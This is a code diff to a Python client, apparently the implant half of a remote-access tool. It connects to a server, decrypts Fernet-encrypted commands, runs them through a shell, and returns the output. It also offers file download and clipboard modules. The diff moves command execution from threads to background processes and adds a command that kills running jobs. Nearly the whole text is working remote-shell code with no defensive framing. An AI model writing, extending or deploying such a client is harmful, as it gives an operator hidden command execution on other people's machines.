@@ -7,7 +7,7 @@ import struct
 import subprocess
 import sys
 import time
-import threading
+from multiprocessing import Process, Queue
 
 import requests
 from cryptography.fernet import Fernet
@@ -16,6 +16,7 @@ commands = '\nAvaliable Modules\n'
 
 commands += '- download {url} (Downloads file from URL)\n'
 commands += '- threads (see running threads)\n'
+commands += '- kill {pid} (kills a thread with pid)\n'
 
 try:
     import pyperclip
@@ -35,28 +36,17 @@ except Exception as e:
     print(f'zipfile import error: {e}')
     _zipfile = False
 
+def shell(q, data):
+    try:
+        cmd = subprocess.Popen(data[:].decode(), shell=True, stdout=subprocess.PIPE,
+                                stderr=subprocess.PIPE, stdin=subprocess.PIPE)
+        output_bytes = cmd.stdout.read() + cmd.stderr.read()
+        q.put(output_bytes.decode(errors="replace"))
+    except Exception as e:
+        # TODO: Error description is lost
+        q.put("Command execution unsuccessful: %s" %str(e))
+    return
 
-class Threader(threading.Thread):
-
-    def __init__(self, group=None, target=None, name=None,
-                 args=(), kwargs={}, Verbose=None):
-        threading.Thread.__init__(self, group, target, name, args, kwargs)
-        self._args = args
-        self._return = None
-        threading.Thread.daemon = True
-        self._kill = threading.Event()
-        self._interval = 10
-
-    def run(self):
-        if self._target is not None:
-            self._return = self._target(*self._args, **self._kwargs)
-
-    def join(self, *args):
-        threading.Thread.join(self, *args)
-        return self._return
-
-    def kill(self):
-        self._kill.set()
 
 
 class Client(object):
@@ -65,6 +55,7 @@ class Client(object):
         self.serverHost = '127.0.0.1'
         self.serverPort = 9999
         self.socket = None
+        self.q = Queue()
         self.Threads = []
         # Time to wait for threads to finish
         self.WAIT_TIME = 10
@@ -137,11 +128,25 @@ class Client(object):
                 return ""
         if data[:7].lower() == 'modules':
             return commands
+        if data[:4].lower() == 'kill':
+            pid = data[5:].strip()
+            try:
+                pid = int(pid)
+            except:
+                return 'PID has to be a integer'
+            for thr in self.Threads:
+                if thr[0].is_alive():
+                    if thr[0].pid == pid:
+                        thr[0].terminate()
+                        return f"Killed PID:{pid} Successfully"
+                else:
+                    self.Threads.remove(thr)
+            return f"PID: {pid} is invalid or is already killed"
         if data[:7].lower() == 'threads':
             return_threads = "Threads:\n\n"
             for thr in self.Threads:
-                if thr.isAlive():
-                    return_threads += thr._args[0].decode() + "\n"
+                if thr[0].is_alive():
+                    return_threads += f"PID: {thr[0].pid} - {thr[1]}"
                 else:
                     self.Threads.remove(thr)
             return return_threads
@@ -203,8 +208,11 @@ class Client(object):
             try:
                 data = self.Crypt.decrypt(data)
             except Exception as e:
-                print(e)
+                print(f"Decryption Error: {e}")
                 break
+            if data == b' ':
+                self.print_output(' ')
+                continue
             if data[:].decode().lower() == 'quit':
                 self.socket.close()
                 break
@@ -213,20 +221,15 @@ class Client(object):
             except Exception as e:
                 output_str = f"Custom command failed: {e}"
             if (output_str == None) and len(data) > 0:
-                def shell(data):
-                    try:
-                        cmd = subprocess.Popen(data[:].decode(), shell=True, stdout=subprocess.PIPE,
-                                               stderr=subprocess.PIPE, stdin=subprocess.PIPE)
-                        output_bytes = cmd.stdout.read() + cmd.stderr.read()
-                        return output_bytes.decode(errors="replace")
-                    except Exception as e:
-                        # TODO: Error description is lost
-                        return "Command execution unsuccessful: %s" %str(e)
-                self.Threads.append(Threader(target=shell, args=(data,)))
-                self.Threads[-1].start()
-                output_str = self.Threads[-1].join(self.WAIT_TIME)
-                if self.Threads[-1].isAlive():
+
+                self.Threads.append((Process(target=shell, args=(self.q, data)), data))
+                self.Threads[-1][0].daemon = True
+                self.Threads[-1][0].start()
+                self.Threads[-1][0].join(self.WAIT_TIME)
+                if self.Threads[-1][0].is_alive():
                     output_str = "Command took too long... Will keep running in background."
+                else:
+                    output_str = self.q.get()
 
             if output_str is not None:
                 try:
